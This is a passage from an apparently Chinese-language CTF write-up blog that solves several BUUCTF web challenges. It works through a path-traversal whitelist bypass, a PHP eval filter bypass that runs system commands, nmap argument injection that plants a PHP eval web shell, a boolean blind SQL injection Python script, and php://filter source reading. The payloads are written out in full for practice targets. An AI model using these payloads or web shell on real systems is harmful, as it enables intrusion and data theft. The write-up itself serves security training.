+<p><img src="https://i.loli.net/2020/03/01/diSt4J52Way7vQc.png" alt="Snipaste_2020-03-01_11-54-59.png"><br>将获取到的admin用户密码登录即可得到flag。<br><img src="https://i.loli.net/2020/03/01/b2in1eEQVX8oITM.png" alt="Snipaste_2020-03-01_11-58-36.png"></p>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>这道题算是非常基础的，但是对于我这样的蒻赍来说还是非常有意义的。</p>
+<ol>
+<li>熟悉了sql语句的语法。知道了information_schema这个数据库存储着别的数据库的数据，比如这个数据库的SCHEMATA表存储着所有数据库的名字。tables这个表存着所有数据库的表名，columns这个表存着所有数据库的列名。</li>
+<li>熟悉了查询语法。from后面要接一个表名。后面可以加限制条件等。</li>
+<li>from后面的表名不需要加引号，比如 select from admin。这里就不加引号。而且加了反而查不出来。(也有可能是因为这里的注入点id不需要闭合的关系)<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="HCTF-2018-WarmUP"><a href="#HCTF-2018-WarmUP" class="headerlink" title="[HCTF 2018]WarmUP"></a>[HCTF 2018]WarmUP</h2>代码审计题。内容如下<br><img src="https://i.loli.net/2020/02/13/k7TWCAxXeVEq5ph.png" alt="Snipaste_2020-02-13_10-07-28.png"><br>查看源代码<br><img src="https://i.loli.net/2020/02/13/bU63Os21yErkRmn.png" alt="Snipaste_2020-02-13_10-09-08.png"><br>发现提示了source.php,去看看<br><img src="https://i.loli.net/2020/02/13/ZvosTnR3U1tLMQa.png" alt="Snipaste_2020-02-13_10-11-58.png"><br>接下来就是要审计的内容了。<br>首先定义了一个类里面的checkFile方法，接受一个page参数</li>
+</ol>
+<p><strong>注意到方法里有一个白名单，包含了hint.php和source.php</strong><br>去hint.php看看<br>内容只有一句话<br>flag not here, and flag in ffffllllaaaagggg<br>告诉了flag的所在地。继续审计代码<br>在checkFile函数中检查了page参数是否存在和是否为字符串，如果不满足条件就返回false，否则进入下一步。<br>如果page满足白名单，返回true<br>如果不满足白名单，进入下一步截取子字符串赋值给$_page，这里将$page作为参数，截取到第一个?的位置。<br>如果$_page满足白名单返回true，如果不满足就对$_page进行urldecode操作，然后将$_page作为参数，<br>截取到第一个?出现的位置，将结果赋值给$_page，再次检查是否满足白名单。<br>—————-分割线————————–</p>
+<p>再往下看，代码判断了请求是否包含参数file,并且对file进行了检查，然后调用了刚才分析的checkFile函数<br>对file检查。如果判断结果都为真，就包含file。<br>刚才笔者对checkFile的分析中，可以看出，如果file不满足白名单，会对file进行截取再判断。<br>而截取的位置是第一个?出现的地方。<br>如果file=source.php?../../../../../../../ffffllllaaaagggg,<br>checkFile函数在第一次判断不符合白名单后会截取，截取后内容变为source.php,满足白名单。<br>于是包含了file这个文件。但是由于file有路径遍历问题，最后会读取到ffffllllaaaagggg文件。<br>拿到flag。<br><img src="https://i.loli.net/2020/02/13/ICJck5OfB8UpvrD.png" alt="Snipaste_2020-02-13_10-28-13.png"></p>
+<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><ol>
+<li>利用了代码判断的漏洞，使用?绕过了检查</li>
+<li>利用文件包含中没有检查路径遍历的问题，使用../../../的方式读取了想要读取的文件。<h2 id="CISCN-2019初赛-Love-Math"><a href="#CISCN-2019初赛-Love-Math" class="headerlink" title="[CISCN 2019初赛] Love Math"></a>[CISCN 2019初赛] Love Math</h2>命令执行题，内容如下<br><img src="https://i.loli.net/2020/02/13/Uq4ONxe5P9MsWnR.png" alt="Snipaste_2020-02-13_23-49-50.png"><br>分析代码内容，发现将参数c的内容复制到content中，对content进行一系列限制，然后使用<br>eval(‘echo ‘.$content.’;’);对内容进行计算回显。</li>
+</ol>
+<p><strong>限制</strong><br>首先对参数c的长度有限制。不能大于80.<br>其次对c的内容有限制，不能使用空格，转义符，方括号等<br>最后，对可用函数有限制，可用函数为<a href="http://www.w3school.com.cn/php/php_ref_math.asp" target="_blank" rel="noopener">传送门</a> 列出的一系列常用函数。<br><strong>思路</strong><br>根据eval函数，想办法绕过限制执行命令拿到flag。<br>也就是说要想办法执行eval(‘echo ‘.’system(something)’.’;’);<br>但是可用函数中并没有system函数可用，也就是说接下来要想办法把system传到c里面。<br>由于system不能直接用，那么剩下的只有自己拼凑和从别的变量读取(使用可用函数拼凑出$_GET或$_POST)<br>这里由于有长度限制，直接拼凑system不现实，而且这样的话后面要执行的命令也要利用现有可用函数拼凑出来。<br><strong>于是思路可以变成利用现有函数拼凑出$_GET或者$_POST</strong><br>这里就是突破口了，可用的函数里什么函数可以使用来达成目的呢？<br><img src="https://i.loli.net/2020/02/14/3XBnIQh8Hwod1VP.png" alt="Snipaste_2020-02-14_00-07-00.png"><br>图中圈出了两个函数，其中base_convert函数可以在任意进制间转换<br><strong>也就是说我们可以通过这个函数转换出我们想要的任何函数</strong><br>因为有长度限制，这个函数可用的次数肯定也是有限制的，能少用尽量少用。这里就使用一次。<br>要拼凑出_GET或_POST可以使用hex2bin这会将十六进制数字转换成二进制字符串，可以看看例子<br><img src="https://i.loli.net/2020/02/14/hxlkDS6QN2RPAFr.png" alt="Snipaste_2020-02-14_00-12-17.png"><br>首先要使用base_convert(37907361743,10,36)拼凑出hex2bin<br>你问我怎么知道37907361743可以转换成hex2bin?随便找个在线进制转换输入36进制hex2bin看看十进制数字就行了<br><strong>现在有了hex2bin，但是这个函数接受的参数是十六进制的，我们能直接输入16进制吗？</strong>不能。<br>因为不符合下面正则匹配的规则(字母起头后面一直匹配数字或字母直到不是数字或字母为止)，所以这里还需要把十进制转换成十六进制。<br>也就是需要使用dechex函数将十进制转换成十六进制。<br>这里以拼凑_GET为例。首先运行bin2hex(‘_GET’)看看输出<br><img src="https://i.loli.net/2020/02/14/vO5MfYyHb2jtq6L.png" alt="Snipaste_2020-02-14_00-30-33.png"><br>再利用在线进制转换将输出转成十进制，得到1598506324<br><strong>于是现在/?c=base_convert(37907361743,10,36)(dechex(1598506324))就是_GET了。为什么不直接拼凑$_GET呢？</strong><br>当然是借鉴了大佬的方法，可以缩减长度。使用/?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324))<br>别忘了这最后是要在eval里执行的，<strong>所以执行的语句相当于$pi=_GET</strong><br>还有一个，php语句间，通过;分隔。于是可以这样<br>/?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi<br>上面这句相当于$pi=_GET;$_GET<br>通过$_GET获取其他变量的[]被过滤了。<strong>但是还有{}可以使用！</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;function&#125;($$pi&#123;cmd&#125;)</span><br></pre></td></tr></table></figure>
+<p>这样就这样调用$_GET{}获取要执行的函数(这里当然是一开始说到的system)和要执行的命令。<br><strong>但是这里不能真的写function和cmd作为参数，因为要满足下面的正则匹配规则。</strong><br>由于长度限制，本着越短小精悍越好的原则，分别使用abs和exp作为参数。得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?abs=system&amp;exp=ls /&amp;c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;exp&#125;)</span><br></pre></td></tr></table></figure>
+<p>这里再分析一下正则部分，先看看函数是什么意思<br><img src="https://i.loli.net/2020/02/14/qhHwfUSnrIuov9x.png" alt="Snipaste_2020-02-14_00-46-33.png"><br>也就是说找出参数c里面所有符合规则的部分(英文字母打头后接数字字母或者_等，比如tan2,aaq342_a等都符合)<br><strong>本题把匹配的部分都存储到了$used_funcs中，再与白名单进行匹配。所有说可用函数有限。</strong><br>最后看看构造的payload打上去会变成什么样子</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval(&apos;echo &apos; . &apos;$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;exp&#125;))&apos; . &apos;;&apos;);</span><br><span class="line"></span><br><span class="line">也就是eval(&apos;echo &apos; . &apos;$pi=_GET;$GET&#123;abs&#125;($_GET&#123;exp&#125;) . &apos;;&apos;);由于abs为system且exp为ls /于是变为</span><br><span class="line">eval(&apos;echo &apos; . &apos;$pi=_GET;system(ls /)&apos; . &apos;;&apos;);</span><br></pre></td></tr></table></figure>
+<p>打上去看看效果<br><img src="https://i.loli.net/2020/02/14/ZDJdYTLfB5XF12P.png" alt="Snipaste_2020-02-14_00-56-50.png"><br>发现了根目录下有个flag文件。使用payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?abs=system&amp;exp=cat /flag&amp;c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;exp&#125;)</span><br></pre></td></tr></table></figure>
+<p>打上去看看效果<br><img src="https://i.loli.net/2020/02/14/jTb1flvrXZwIFDt.png" alt="Snipaste_2020-02-14_00-59-35.png"><br>成功拿到flag</p>
+<h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><ol>
+<li>$_GET[]可用$_GET{}代替，也就是[]可代替{}，同理POST等也可</li>
+<li>可以利用base_convert函数转换出任意函数名</li>
+<li>绕过的时候要有针对性，比如为了使用system想到了构造_GET而不是直接构造system(这里因为长度限制)<br>补充大佬的方法，除了使用这种利用现有函数拼凑的方法，还可以使用字符串异或的方法(php可用)来获取新的字符串<br>收获：更加熟悉了php的eval使用等。对正则等更加熟悉了。</li>
+</ol>
+<p><strong>补充知识</strong><br>4. 在php中可以使用{$a()}的方法来调用变量，例如$a=phpinfo;那么{$a()}会调用phpinfo()；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5. sql注入中可以使用/**/来绕过空格过滤admin&apos;/**/or/**/&apos;1&apos;=&apos;1等于admin&apos; or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="BUUCTF 2018 Online Tool"></a>BUUCTF 2018 Online Tool</h2><p>打开靶机发现是这样的<br><img src="https://i.loli.net/2020/02/15/gYKthskbMXO3Tyf.png" alt="Snipaste_2020-02-15_09-48-13.png"><br>来分析一下其中内容</p>
+<p>首先检查了有没有x-forwarded-for请求头来获取用户ip<br>往下看是为了创建一个单独的文件夹给用户使用，没什么问题<br>看到需要一个host参数，后面两个escapeshellarg()和escapeshellcmd()没见过，phpmanual查一下<br>发现escapeshellarg是防止传多个参数<br><img src="https://i.loli.net/2020/02/15/Xyxd9mbA6IqLurD.png" alt="Snipaste_2020-02-15_09-53-30.png"><br>escapeshellcmd是防止执行多个命令<br><img src="https://i.loli.net/2020/02/15/VQocefYCWJ5rlx2.png" alt="Snipaste_2020-02-15_09-54-23.png"><br>这两个函数起到了过滤作用，接下来就是新建一个用户文件夹然后把工作目录改成新建的文件夹。<br>最后是一个system函数，执行了nmap这个命令。<br>推断这题是命令执行题，要做的应该就是绕过上面两个函数的过滤。<br>由于咱啥也不懂那就去查查吧，于是最后发现了这一篇文章<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">传送门</a><br>其中提到了如果对参数使用escapeshellarg()再使用escapeshellcmd()会出问题，<strong>用单引号绕过可以注入参数</strong>。<br>由于咱特别菜所以这时候我还没意识到这个绕过其实不会让咱执行新的命令。<br>一番查询最终发现了这个绕过只能注入参数，要执行新的命令比如nmap xxx | ls /之类的是不行的，都会被escapeshellcmd过滤掉。<br>那就只能使用图中的nmap命令来做事了，<strong>注意已经提到过可以使用’进行参数的注入</strong>。<br>所以就看看nmap有什么可利用的参数可以让咱拿到flag。<br><strong>最后发现了-oG这个参数，-oG file可以把执行的命令和输出一起保存到指定的文件中。</strong><br>最后咱打出了自己的payload </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?host=&apos; -oG test.php &lt;?php eval($_POST[&quot;123456&quot;]); ?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以用在线工具看看这个语句最后会变成啥样<br><img src="https://i.loli.net/2020/02/15/ByQoAF5fXMaKNUm.png" alt="Snipaste_2020-02-15_10-19-20.png"><br>其实这部分我一直不熟悉所以在试payload的时候错了很多次。<br>先解释一下这部分最后会变成什么样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;\\&apos;&apos; -oG test.php \&lt;\?php eval\(\$_POST\[&quot;123456&quot;\]\)\; \?\&gt;\&apos;</span><br></pre></td></tr></table></figure>
+<p>这里要先补充一个知识，写命令的时候如果有参数是用单引号包起来的话会被看成一个参数<br>比如 ls -a和ls ‘-a’执行效果其实是一样的<br>ls -a 和 ls ‘’-a也是一样的，如图<br><img src="https://i.loli.net/2020/02/15/axsOdpMN6hYFnPS.png" alt="Snipaste_2020-02-15_10-25-34.png"><br>不难理解，如果有两个单引号’’在一起，如果没包着东西在里面，那就可以看成没有这个东西，不影响<br><strong>如果两个’’间包有东西，那么这对引号间包的东西会被看成一个参数</strong><br>比如你可以执行 ls -a -d 但是却不可以执行ls ‘-a -d’<br>这是因为 ls -a -d是看成两个参数来执行的，但是ls ‘-a -d’是把 -a -d看成一个参数，那就有问题了<br><img src="https://i.loli.net/2020/02/15/Yg5Lta7xjXfidUW.png" alt="Snipaste_2020-02-15_10-28-53.png"><br>知道这部分知识之后就可以解释为什么</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;\\&apos;&apos; -oG test.php \&lt;\?php eval\(\$_POST\[&quot;123456&quot;\]\)\; \?\&gt;\&apos;</span><br></pre></td></tr></table></figure>
+<p>可以注入参数了<br>可以看到一开始两个单引号，就是咱刚才说的空白连接符，没影响，\\变为\<br>后面又是两个单引号也没影响<br>于是最后变成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\ -oG test.php &lt;?php eval($_POST[&quot;123456&quot;]); ?&gt;&apos;</span><br></pre></td></tr></table></figure>
+<p>也就是说最后执行了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F \ -oG test.php &lt;?php eval($_POST[&quot;123456&quot;]); ?&gt;&apos;</span><br></pre></td></tr></table></figure>
+<p><strong>注意这是转义后的结果，单独这样执行是行不通的！</strong><br>在本地试一下咱的命令看看<br><img src="https://i.loli.net/2020/02/15/pbA9Lfod2MsUFDn.png" alt="Snipaste_2020-02-15_10-51-07.png"><br>可以看到成功将输出保存到了test.php<br>看看写进去了啥<br><img src="https://i.loli.net/2020/02/15/yKWNFbv1goTnP6r.png" alt="Snipaste_2020-02-15_10-59-01.png"><br>发现写进去的时候其实命令自己调换了位置，把选项参数提前了，最重要的是成功写进了咱的一句话木马！<br>打上去后可以看到输出变成这样<br><img src="https://i.loli.net/2020/02/15/ZAPfyzlauJTSt1G.png" alt="Snipaste_2020-02-15_10-10-23.png"><br>拿蚁剑连一下<br><img src="https://i.loli.net/2020/02/15/WrKftVxNscknewo.png" alt="Snipaste_2020-02-15_10-12-35.png"><br>可以看到已经打进去了，在根目录下发现了咱要的flag。<br><img src="https://i.loli.net/2020/02/15/zlD2NaLqYCjXJ4I.png" alt="Snipaste_2020-02-15_10-14-08.png"></p>
+<h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><ol>
+<li>escapeshellarg和escapeshellcmd连用(先arg再cmd)可以注入参数</li>
+<li>对自己可控输入应该充分查询可用性，比如本题可用命令nmap，考点就在-oG参数的文件输出</li>
+<li>命令里面两个单独的单引号没影响，单引号包着的东西看作一个参数</li>
+<li>php会尝试解释双引号中带$的变量，比如$test = “aaa”;”$test”会变成”aaa”；<br>这题的突破口就在-oG这里，不明白这个参数是做不出来的，以后遇到这种可用命令固定<br>参数可控的类型一定要注意查看各种参数，也许有可利用的参数。尤其是这种将输出保存起来的参数！</li>
+</ol>
+<h2 id="Hack-World"><a href="#Hack-World" class="headerlink" title="Hack World"></a>Hack World</h2><p>SQL注入题。<br>进去界面如下：<br><img src="https://i.loli.net/2020/03/07/Upm3vkEn7T2tjl5.png" alt="Snipaste_2020-03-07_12-19-14.png"><br>已经告诉了我们flag就在表flag的flag列。<br>随便输入一些测试数据。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">&apos;/**/or/**/&apos;1&apos;=&apos;1</span><br><span class="line">&apos; union select 1,2</span><br></pre></td></tr></table></figure>
+<p>发现都不行，过滤了不少东西。<br>最后发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1^1^1可以使用(效果和1相同)</span><br></pre></td></tr></table></figure>
+<p>于是考虑使用布尔盲注的方法逐个读取flag。<br>构造payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1^(ascii(substr((select(flag)from(flag)),1,1))&gt; 0)^1</span><br></pre></td></tr></table></figure>
+<p>其中(ascii(substr((select(flag)from(flag)),1,1))&gt; 0)如果为真会返回1，为假则返回0<br>于是可以根据返回的数据判断当前这一位flag到底是哪一个字符。<br><strong>抓包查看数据提交方式</strong><br><img src="https://i.loli.net/2020/03/07/KFjT5YB7dh2zoZi.png" alt="Snipaste_2020-03-07_12-32-26.png"><br>然后编写脚本如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def restart_if_failed(func,max_tries,args=(), kwargs=&#123;&#125;, secs=120, sleep=None):</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    任务失败时重启目标函数</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    import traceback</span><br><span class="line">    from collections import deque</span><br><span class="line">    dq = deque(maxlen=max_tries)</span><br><span class="line">    while True:</span><br><span class="line">        dq.append(time.time())</span><br><span class="line">        try:</span><br><span class="line">            res = func(*args, **kwargs)</span><br><span class="line">        except:</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">            if len(dq) == max_tries and time.time() - dq[0] &lt; secs:</span><br><span class="line">                break</span><br><span class="line">            if sleep != None:</span><br><span class="line">                time.sleep(sleep)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">def post_payload(url, i, j):</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    发送payload</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    time.sleep(0.05)</span><br><span class="line">    payload = f&apos;1^1^(ascii(substr((select(flag)from(flag)),&#123;j&#125;,1))&gt;&#123;i&#125;)&apos;</span><br><span class="line">    print(payload)</span><br><span class="line">    res = session.post(url, data=&#123;&apos;id&apos;: payload&#125;, timeout=1)</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">url = &apos;http://182f5bff-037f-4236-962d-af0e99be6183.node3.buuoj.cn/index.php&apos;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">session = requests.session()</span><br><span class="line">for j in range(1, 50):</span><br><span class="line">    for i in range(0,255):</span><br><span class="line">        try:</span><br><span class="line">            res = post_payload(url, i, j)</span><br><span class="line">        except:</span><br><span class="line">            res = restart_if_failed(post_payload, 20, (url,i,j))</span><br><span class="line">        if res.text.find(&apos;Error&apos;) != -1:</span><br><span class="line">            flag += chr(i)</span><br><span class="line">            break</span><br><span class="line">    print(flag)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<p>跑个半小时这样就能出来了。</p>
+<h3 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h3><p>这一题的难点主要在于发现注入点。fuzz到^异或操作的点之后只剩下编写脚本的工作了。<br>值得注意的是，本题过滤了空格还有/**/的方式。查询语句使用的是<br>1^(ascii(substr((select(flag)from(flag)),1,1))&gt; 0)^1 这样的形式<br>是没有空格的，这里可以发现如果过滤了空格可以使用()的形式尝试绕过<br>还要注意的是，本题flag表其实只有一条flag记录，如果是多行数据还需要另外改动payload。</p>
+<ul>
+<li>测试的时候要注意对查询字符串尝试构造异或操作</li>
+<li>过滤空格的情况下，除了/**/绕过，还可使用()包起查询字符的方式尝试绕过。</li>
+</ul>
+<h2 id="CyberPunk"><a href="#CyberPunk" class="headerlink" title="CyberPunk"></a>CyberPunk</h2><p>进去的页面是这样的：<br><img src="https://i.loli.net/2020/03/07/gTwE4eFSUD29mQG.png" alt="test"><br>ctrl+u看源码，发现有个?file的提示<br><img src="https://i.loli.net/2020/03/07/UumWdvCcwA4laop.png" alt="Snipaste_2020-03-07_18-48-38.png"><br>看到这个熟悉可爱的参数，应该就能想到使用php://filter读取源码。<br>然后尝试读源码。发现可以读几个文件的源码。<br>index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">ini_set(&apos;open_basedir&apos;, &apos;/var/www/html/&apos;);</span><br><span class="line"></span><br><span class="line">// $file = $_GET[&quot;file&quot;];</span><br><span class="line">$file = (isset($_GET[&apos;file&apos;]) ? $_GET[&apos;file&apos;] : null);</span><br><span class="line">if (isset($file))&#123;</span><br><span class="line">    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) &#123;</span><br><span class="line">        echo(&apos;no way!&apos;);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    @include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;index&lt;/title&gt;</span><br><span class="line">&lt;base href=&quot;./&quot;&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;h&quot;&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;h2&gt;2077发售了,不来份实体典藏版吗?&lt;/h2&gt;</span><br><span class="line">        &lt;img class=&quot;logo&quot; src=&quot;./assets/img/logo-en.png&quot;&gt;&lt;!--LOGOLOGOLOGOLOGO--&gt;</span><br><span class="line">        &lt;div class=&quot;row&quot;&gt;</span><br><span class="line">			&lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class="line">                &lt;h3&gt;提交订单&lt;/h3&gt;</span><br><span class="line">                &lt;form role=&quot;form&quot; action=&quot;./confirm.php&quot; method=&quot;post&quot; enctype=&quot;application/x-www-urlencoded&quot;&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;h3&gt;姓名:&lt;/h3&gt;</span><br><span class="line">                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;电话:&lt;/h3&gt;</span><br><span class="line">                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;地址:&lt;/h3&gt;</span><br><span class="line">                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;address&quot;&gt;</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                    &lt;button class=&apos;btn btn-lg  btn-sub btn-white&apos; type=&quot;submit&quot;&gt;我正是送钱之人&lt;/button&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;f&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class=&quot;row&quot;&gt;</span><br><span class="line">            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;</span><br><span class="line">            &lt;a href=&quot;./search.php&quot;&gt;</span><br><span class="line">                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;a href=&quot;./change.php&quot;&gt;</span><br><span class="line">                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;a href=&quot;./delete.php&quot;&gt;</span><br><span class="line">                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!--?file=?--&gt;</span><br></pre></td></tr></table></figure>
+<p>confirm.php</p>
